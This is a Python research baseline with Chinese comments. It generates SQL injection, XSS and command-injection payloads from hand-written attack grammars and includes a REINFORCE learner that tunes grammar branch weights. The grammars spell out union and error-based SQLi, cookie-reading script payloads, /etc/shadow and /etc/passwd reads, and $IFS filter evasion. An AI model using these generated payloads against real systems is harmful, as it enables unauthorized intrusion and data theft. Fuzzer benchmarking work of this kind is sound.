"""
Grammar-based Fuzzer 基线方法
=============================

基于攻击语法的payload生成器。
包含:
1. GrammarFuzzer: 纯随机语法生成
2. GrammarRL: 使用RL学习语法分支权重 (不使用语言模型)
"""

import random
import numpy as np
from typing import List, Dict, Optional, Tuple, Set
from dataclasses import dataclass, field
from collections import defaultdict


# ==================== 语法定义 ====================

@dataclass
class GrammarRule:
    """语法规则"""
    lhs: str  # 左侧非终结符
    rhs: List[str]  # 右侧符号列表
    weight: float = 1.0  # 规则权重
    
    def __str__(self):
        return f"{self.lhs} -> {' '.join(self.rhs)}"


@dataclass
class Grammar:
    """上下文无关语法"""
    rules: Dict[str, List[GrammarRule]] = field(default_factory=dict)
    start_symbol: str = "<start>"
    terminals: Set[str] = field(default_factory=set)
    non_terminals: Set[str] = field(default_factory=set)
    
    def add_rule(self, lhs: str, rhs: List[str], weight: float = 1.0):
        """添加规则"""
        if lhs not in self.rules:
            self.rules[lhs] = []
        self.rules[lhs].append(GrammarRule(lhs, rhs, weight))
        
        # 更新符号集合
        self.non_terminals.add(lhs)
        for symbol in rhs:
            if symbol.startswith('<') and symbol.endswith('>'):
                self.non_terminals.add(symbol)
            else:
                self.terminals.add(symbol)
    
    def get_rules(self, symbol: str) -> List[GrammarRule]:
        """获取某个非终结符的所有规则"""
        return self.rules.get(symbol, [])
    
    def is_terminal(self, symbol: str) -> bool:
        """判断是否为终结符"""
        return not (symbol.startswith('<') and symbol.endswith('>'))


# ==================== 预定义语法 ====================

def create_sqli_grammar() -> Grammar:
    """创建SQLi攻击语法 (简化版)"""
    grammar = Grammar(start_symbol="<start>")
    
    # 起始规则
    grammar.add_rule("<start>", ["<context>", "<attack>", "<comment>"])
    grammar.add_rule("<start>", ["<context>", "<attack>"])
    
    # 上下文
    grammar.add_rule("<context>", ["'"])
    grammar.add_rule("<context>", ["\""])
    grammar.add_rule("<context>", ["1"])
    grammar.add_rule("<context>", ["0"])
    grammar.add_rule("<context>", ["-1"])
    grammar.add_rule("<context>", [""])
    
    # 攻击类型
    grammar.add_rule("<attack>", ["<boolean_attack>"])
    grammar.add_rule("<attack>", ["<union_attack>"])
    grammar.add_rule("<attack>", ["<error_attack>"])
    grammar.add_rule("<attack>", ["<piggyback_attack>"])
    
    # 布尔注入
    grammar.add_rule("<boolean_attack>", ["<space>", "<operator>", "<space>", "<boolean_expr>"])
    grammar.add_rule("<boolean_expr>", ["<number>", "<comparison>", "<number>"])
    grammar.add_rule("<boolean_expr>", ["<string>", "<comparison>", "<string>"])
    grammar.add_rule("<boolean_expr>", ["TRUE"])
    grammar.add_rule("<boolean_expr>", ["FALSE"])
    
    # Union注入
    grammar.add_rule("<union_attack>", ["<space>", "UNION", "<space>", "SELECT", "<space>", "<select_list>"])
    grammar.add_rule("<select_list>", ["<number>"])
    grammar.add_rule("<select_list>", ["<number>", ",", "<select_list>"])
    grammar.add_rule("<select_list>", ["NULL"])
    
    # 错误注入
    grammar.add_rule("<error_attack>", ["<space>", "AND", "<space>", "<function>"])
    grammar.add_rule("<function>", ["EXTRACTVALUE(1,", "<xpath>", ")"])
    grammar.add_rule("<function>", ["UPDATEXML(1,", "<xpath>", ",1)"])
    grammar.add_rule("<xpath>", ["CONCAT(0x7e,VERSION())"])
    grammar.add_rule("<xpath>", ["CONCAT(0x7e,DATABASE())"])
    
    # Piggyback注入
    grammar.add_rule("<piggyback_attack>", ["<terminator>", "<space>", "<sql_statement>"])
    grammar.add_rule("<sql_statement>", ["SELECT", "<space>", "<select_list>", "<space>", "FROM", "<space>", "<table>"])
    grammar.add_rule("<table>", ["users"])
    grammar.add_rule("<table>", ["information_schema.tables"])
    
    # 运算符
    grammar.add_rule("<operator>", ["AND"])
    grammar.add_rule("<operator>", ["OR"])
    grammar.add_rule("<operator>", ["NOT"])
    grammar.add_rule("<operator>", ["XOR"])
    
    # 比较运算符
    grammar.add_rule("<comparison>", ["="])
    grammar.add_rule("<comparison>", ["!="])
    grammar.add_rule("<comparison>", ["<"])
    grammar.add_rule("<comparison>", [">"])
    grammar.add_rule("<comparison>", ["LIKE"])
    
    # 数字
    grammar.add_rule("<number>", ["1"])
    grammar.add_rule("<number>", ["0"])
    grammar.add_rule("<number>", ["2"])
    grammar.add_rule("<number>", ["999"])
    
    # 字符串
    grammar.add_rule("<string>", ["'a'"])
    grammar.add_rule("<string>", ["'test'"])
    
    # 空白
    grammar.add_rule("<space>", [" "])
    grammar.add_rule("<space>", ["%20"])
    grammar.add_rule("<space>", ["%09"])
    grammar.add_rule("<space>", ["/**/"])
    grammar.add_rule("<space>", ["%0a"])
    
    # 终止符
    grammar.add_rule("<terminator>", [";"])
    grammar.add_rule("<terminator>", ["%3B"])
    
    # 注释
    grammar.add_rule("<comment>", ["--"])
    grammar.add_rule("<comment>", ["#"])
    grammar.add_rule("<comment>", ["-- -"])
    grammar.add_rule("<comment>", [";--"])
    grammar.add_rule("<comment>", ["/*"])
    
    return grammar


def create_xss_grammar() -> Grammar:
    """创建XSS攻击语法 (简化版)"""
    grammar = Grammar(start_symbol="<start>")
    
    # 起始规则
    grammar.add_rule("<start>", ["<tag_attack>"])
    grammar.add_rule("<start>", ["<event_attack>"])
    grammar.add_rule("<start>", ["<javascript_uri>"])
    
    # 标签攻击
    grammar.add_rule("<tag_attack>", ["<script_tag>"])
    grammar.add_rule("<tag_attack>", ["<img_tag>"])
    grammar.add_rule("<tag_attack>", ["<svg_tag>"])
    
    grammar.add_rule("<script_tag>", ["<script>", "<js_payload>", "</script>"])
    grammar.add_rule("<img_tag>", ["<img", " ", "src=x", " ", "<event>", "=", "<js_payload>", ">"])
    grammar.add_rule("<svg_tag>", ["<svg", " ", "<event>", "=", "<js_payload>", ">"])
    
    # 事件处理器
    grammar.add_rule("<event_attack>", ["<quote>", " ", "<event>", "=", "<js_payload>", " ", "<quote>"])
    
    grammar.add_rule("<event>", ["onerror"])
    grammar.add_rule("<event>", ["onload"])
    grammar.add_rule("<event>", ["onclick"])
    grammar.add_rule("<event>", ["onmouseover"])
    grammar.add_rule("<event>", ["onfocus"])
    
    # JavaScript URI
    grammar.add_rule("<javascript_uri>", ["javascript:", "<js_code>"])
    
    # JS payload
    grammar.add_rule("<js_payload>", ["\"", "<js_code>", "\""])
    grammar.add_rule("<js_payload>", ["'", "<js_code>", "'"])
    
    grammar.add_rule("<js_code>", ["alert(1)"])
    grammar.add_rule("<js_code>", ["alert('XSS')"])
    grammar.add_rule("<js_code>", ["confirm(1)"])
    grammar.add_rule("<js_code>", ["prompt(1)"])
    grammar.add_rule("<js_code>", ["alert(document.cookie)"])
    
    # 引号
    grammar.add_rule("<quote>", ["'"])
    grammar.add_rule("<quote>", ["\""])
    grammar.add_rule("<quote>", [""])
    
    return grammar


def create_rce_grammar() -> Grammar:
    """创建RCE攻击语法 (简化版)"""
    grammar = Grammar(start_symbol="<start>")
    
    # 起始规则
    grammar.add_rule("<start>", ["<separator>", "<command>"])
    grammar.add_rule("<start>", ["<command_substitution>"])
    
    # 分隔符
    grammar.add_rule("<separator>", [";"])
    grammar.add_rule("<separator>", ["|"])
    grammar.add_rule("<separator>", ["||"])
    grammar.add_rule("<separator>", ["&&"])
    grammar.add_rule("<separator>", ["&"])
    grammar.add_rule("<separator>", ["\n"])
    grammar.add_rule("<separator>", ["%0a"])
    grammar.add_rule("<separator>", ["%0d%0a"])
    
    # 命令
    grammar.add_rule("<command>", ["<cmd_name>"])
    grammar.add_rule("<command>", ["<cmd_name>", "<space>", "<args>"])
    grammar.add_rule("<command>", ["<cmd_name>", "<space>", "<file_path>"])
    
    # 命令名
    grammar.add_rule("<cmd_name>", ["ls"])
    grammar.add_rule("<cmd_name>", ["cat"])
    grammar.add_rule("<cmd_name>", ["id"])
    grammar.add_rule("<cmd_name>", ["whoami"])
    grammar.add_rule("<cmd_name>", ["pwd"])
    grammar.add_rule("<cmd_name>", ["uname"])
    grammar.add_rule("<cmd_name>", ["echo"])
    grammar.add_rule("<cmd_name>", ["ping"])
    grammar.add_rule("<cmd_name>", ["curl"])
    grammar.add_rule("<cmd_name>", ["wget"])
    
    # 参数
    grammar.add_rule("<args>", ["-la"])
    grammar.add_rule("<args>", ["-a"])
    grammar.add_rule("<args>", ["-l"])
    grammar.add_rule("<args>", ["-h"])
    grammar.add_rule("<args>", ["-r"])
    
    # 文件路径
    grammar.add_rule("<file_path>", ["/etc/passwd"])
    grammar.add_rule("<file_path>", ["/etc/shadow"])
    grammar.add_rule("<file_path>", ["../../../etc/passwd"])
    grammar.add_rule("<file_path>", ["/tmp/test"])
    grammar.add_rule("<file_path>", ["."])
    
    # 命令替换
    grammar.add_rule("<command_substitution>", ["`", "<command>", "`"])
    grammar.add_rule("<command_substitution>", ["$(", "<command>", ")"])
    
    # 空白
    grammar.add_rule("<space>", [" "])
    grammar.add_rule("<space>", ["$IFS"])
    grammar.add_rule("<space>", ["${IFS}"])
    grammar.add_rule("<space>", ["%20"])
    
    return grammar


# ==================== Grammar Fuzzer ====================

class GrammarFuzzer:
    """
    基于语法的Fuzzer
    
    从给定语法随机派生生成payload。
    """
    
    def __init__(
        self,
        grammar: Grammar,
        max_depth: int = 20,
        seed: int = 42,
    ):
        """
        初始化
        
        Args:
            grammar: 语法对象
            max_depth: 最大派生深度
            seed: 随机种子
        """
        self.grammar = grammar
        self.max_depth = max_depth
        random.seed(seed)
    
    def _select_rule(self, rules: List[GrammarRule]) -> GrammarRule:
        """
        根据权重选择规则
        
        Args:
            rules: 候选规则列表
            
        Returns:
            选中的规则
        """
        weights = [r.weight for r in rules]
        total = sum(weights)
        probs = [w / total for w in weights]
        return random.choices(rules, weights=probs)[0]
    
    def _derive(self, symbol: str, depth: int = 0) -> str:
        """
        递归派生
        
        Args:
            symbol: 当前符号
            depth: 当前深度
            
        Returns:
            派生结果字符串
        """
        # 终结符直接返回
        if self.grammar.is_terminal(symbol):
            return symbol
        
        # 深度限制
        if depth > self.max_depth:
            return ""
        
        # 获取规则
        rules = self.grammar.get_rules(symbol)
        if not rules:
            return ""
        
        # 选择规则
        rule = self._select_rule(rules)
        
        # 递归派生
        result = []
        for s in rule.rhs:
            result.append(self._derive(s, depth + 1))
        
        return ''.join(result)
    
    def generate(self, num_samples: int = 1) -> List[str]:
        """
        生成payload
        
        Args:
            num_samples: 生成数量
            
        Returns:
            payload列表
        """
        return [self._derive(self.grammar.start_symbol) for _ in range(num_samples)]
    
    def generate_unique(self, num_samples: int, max_attempts: int = 10) -> List[str]:
        """
        生成不重复的payload
        
        Args:
            num_samples: 目标数量
            max_attempts: 最大尝试倍数
            
        Returns:
            不重复的payload列表
        """
        seen: Set[str] = set()
        attempts = 0
        max_total = num_samples * max_attempts
        
        while len(seen) < num_samples and attempts < max_total:
            payload = self.generate(1)[0]
            if payload:  # 跳过空payload
                seen.add(payload)
            attempts += 1
        
        return list(seen)[:num_samples]


# ==================== Grammar RL ====================

class GrammarRL:
    """
    基于语法的强化学习
    
    使用RL学习每个非终结符的分支选择权重，不使用语言模型。
    参考论文Table V中的grammar-based RL基线。
    """
    
    def __init__(
        self,
        grammar: Grammar,
        learning_rate: float = 0.01,
        seed: int = 42,
    ):
        """
        初始化
        
        Args:
            grammar: 语法对象
            learning_rate: 学习率
            seed: 随机种子
        """
        self.grammar = grammar
        self.learning_rate = learning_rate
        random.seed(seed)
        np.random.seed(seed)
        
        # 初始化每个非终结符的分支权重 (均匀分布)
        self.weights: Dict[str, np.ndarray] = {}
        for symbol, rules in grammar.rules.items():
            n_rules = len(rules)
            self.weights[symbol] = np.ones(n_rules) / n_rules
    
    def _softmax(self, x: np.ndarray) -> np.ndarray:
        """Softmax函数"""
        exp_x = np.exp(x - np.max(x))
        return exp_x / exp_x.sum()
    
    def _select_rule_with_log(
        self,
        symbol: str,
        rules: List[GrammarRule]
    ) -> Tuple[GrammarRule, int, float]:
        """
        选择规则并记录概率
        
        Args:
            symbol: 非终结符
            rules: 规则列表
            
        Returns:
            (选中的规则, 规则索引, 选择概率)
        """
        probs = self._softmax(self.weights[symbol])
        idx = np.random.choice(len(rules), p=probs)
        return rules[idx], idx, probs[idx]
    
    def _derive_with_trace(
        self,
        symbol: str,
        depth: int = 0,
        max_depth: int = 20
    ) -> Tuple[str, List[Tuple[str, int, float]]]:
        """
        带轨迹的派生
        
        Args:
            symbol: 当前符号
            depth: 当前深度
            max_depth: 最大深度
            
        Returns:
            (派生结果, 选择轨迹)
        """
        trace = []
        
        if self.grammar.is_terminal(symbol):
            return symbol, trace
        
        if depth > max_depth:
            return "", trace
        
        rules = self.grammar.get_rules(symbol)
        if not rules:
            return "", trace
        
        rule, idx, prob = self._select_rule_with_log(symbol, rules)
        trace.append((symbol, idx, prob))
        
        result = []
        for s in rule.rhs:
            sub_result, sub_trace = self._derive_with_trace(s, depth + 1, max_depth)
            result.append(sub_result)
            trace.extend(sub_trace)
        
        return ''.join(result), trace
    
    def generate(self, num_samples: int = 1) -> List[str]:
        """生成payload"""
        return [self._derive_with_trace(self.grammar.start_symbol)[0] for _ in range(num_samples)]
    
    def update(
        self,
        traces: List[List[Tuple[str, int, float]]],
        rewards: List[float]
    ):
        """
        使用REINFORCE更新权重
        
        Args:
            traces: 选择轨迹列表
            rewards: 对应的奖励列表
        """
        # 计算基线 (平均奖励)
        baseline = np.mean(rewards)
        
        # 累积梯度
        gradients: Dict[str, np.ndarray] = {
            s: np.zeros_like(w) for s, w in self.weights.items()
        }
        
        for trace, reward in zip(traces, rewards):
            advantage = reward - baseline
            
            for symbol, idx, prob in trace:
                # 策略梯度: ∇log(π) * advantage
                grad = np.zeros_like(self.weights[symbol])
                grad[idx] = advantage / (prob + 1e-8)
                gradients[symbol] += grad
        
        # 更新权重
        for symbol in self.weights:
            self.weights[symbol] += self.learning_rate * gradients[symbol] / len(traces)
    
    def train(
        self,
        reward_func,
        num_episodes: int = 100,
        batch_size: int = 32,
        verbose: bool = True
    ):
        """
        训练
        
        Args:
            reward_func: 奖励函数 (payload) -> float
            num_episodes: 训练轮数
            batch_size: 批次大小
            verbose: 是否打印日志
        """
        for episode in range(num_episodes):
            # 生成一批样本
            payloads = []
            traces = []
            
            for _ in range(batch_size):
                payload, trace = self._derive_with_trace(self.grammar.start_symbol)
                payloads.append(payload)
                traces.append(trace)
            
            # 计算奖励
            rewards = [reward_func(p) for p in payloads]
            
            # 更新
            self.update(traces, rewards)
            
            if verbose and (episode + 1) % 10 == 0:
                avg_reward = np.mean(rewards)
                print(f"Episode {episode + 1}/{num_episodes}, Avg Reward: {avg_reward:.4f}")


# ==================== 工厂函数 ====================

def create_grammar_fuzzer(attack_type: str, seed: int = 42) -> GrammarFuzzer:
    """
    创建指定攻击类型的语法Fuzzer
    
    Args:
        attack_type: 攻击类型 (sqli/xss/rce)
        seed: 随机种子
        
    Returns:
        GrammarFuzzer对象
    """
    grammar_creators = {
        "sqli": create_sqli_grammar,
        "xss": create_xss_grammar,
        "rce": create_rce_grammar,
    }
    
    creator = grammar_creators.get(attack_type.lower())
    if creator is None:
        raise ValueError(f"未知的攻击类型: {attack_type}")
    
    grammar = creator()
    return GrammarFuzzer(grammar, seed=seed)


def create_grammar_rl(attack_type: str, seed: int = 42) -> GrammarRL:
    """
    创建指定攻击类型的语法RL
    
    Args:
        attack_type: 攻击类型 (sqli/xss/rce)
        seed: 随机种子
        
    Returns:
        GrammarRL对象
    """
    grammar_creators = {
        "sqli": create_sqli_grammar,
        "xss": create_xss_grammar,
        "rce": create_rce_grammar,
    }
    
    creator = grammar_creators.get(attack_type.lower())
    if creator is None:
        raise ValueError(f"未知的攻击类型: {attack_type}")
    
    grammar = creator()
    return GrammarRL(grammar, seed=seed)


if __name__ == "__main__":
    # 测试
    print("测试 GrammarFuzzer:")
    
    for attack_type in ["sqli", "xss", "rce"]:
        print(f"\n{attack_type.upper()}:")
        fuzzer = create_grammar_fuzzer(attack_type)
        samples = fuzzer.generate(5)
        for i, s in enumerate(samples):
            print(f"  [{i+1}] {s}")
    
    print("\n\n测试 GrammarRL:")
    grammar_rl = create_grammar_rl("sqli")
    
    # 简单奖励函数 (长度奖励)
    def simple_reward(payload):
        return min(len(payload) / 100, 1.0)
    
    print("训练前:")
    samples = grammar_rl.generate(3)
    for s in samples:
        print(f"  {s}")
    
    grammar_rl.train(simple_reward, num_episodes=50, batch_size=16, verbose=True)
    
    print("\n训练后:")
    samples = grammar_rl.generate(3)
    for s in samples:
        print(f"  {s}")
